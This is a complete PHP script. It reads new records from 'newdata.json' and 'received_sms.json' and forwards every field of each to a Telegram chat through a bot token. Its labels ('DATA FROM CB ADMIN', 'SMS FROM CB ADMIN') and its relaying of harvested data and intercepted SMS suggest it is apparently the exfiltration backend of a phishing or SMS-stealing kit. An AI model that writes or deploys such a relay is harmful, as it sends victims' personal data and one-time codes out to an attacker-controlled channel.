<?php
function sendMessageToTelegram($message) {
    $telegramConfig = json_decode(file_get_contents('include/telegram_config.json'), true);
    $botToken = $telegramConfig['bot_token'];
    $chatId = $telegramConfig['chat_id'];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_exec($ch);
    curl_close($ch);
}

function checkForNewData() {
    $fulldata = json_decode(file_get_contents('Site/data/newdata.json'), true);
    $smsdata = json_decode(file_get_contents('Site/data/received_sms.json'), true);

    // Read the last processed token from a file
    $lastProcessedTokenFile = 'Site/data/last_processed_token.txt';
    if (!file_exists($lastProcessedTokenFile)) {
        file_put_contents($lastProcessedTokenFile, '');
    }
    $lastProcessedToken = file_get_contents($lastProcessedTokenFile);

    // Check for new data in newdata.json
    foreach ($fulldata as $token => $data) {
        if ($token > $lastProcessedToken) {
            $message = "DATA FROM CB ADMIN:\n";
            foreach ($data as $key => $value) {
                $message .= "$key: $value\n";
            }
            sendMessageToTelegram($message);
            file_put_contents($lastProcessedTokenFile, $token);
        }
    }

    // Check for new data in received_sms.json
    $lastProcessedSmsFile = 'Site/data/last_processed_sms.txt';
    if (!file_exists($lastProcessedSmsFile)) {
        file_put_contents($lastProcessedSmsFile, '');
    }
    $lastProcessedSms = file_get_contents($lastProcessedSmsFile);

    foreach ($smsdata as $token => $data) {
        if ($token > $lastProcessedSms) {
            $message = "SMS FROM CB ADMIN:\n";
            foreach ($data as $key => $value) {
                $message .= "$key: $value\n";
            }
            sendMessageToTelegram($message);
            file_put_contents($lastProcessedSmsFile, $token);
        }
    }
}

// Run the check
checkForNewData();
?>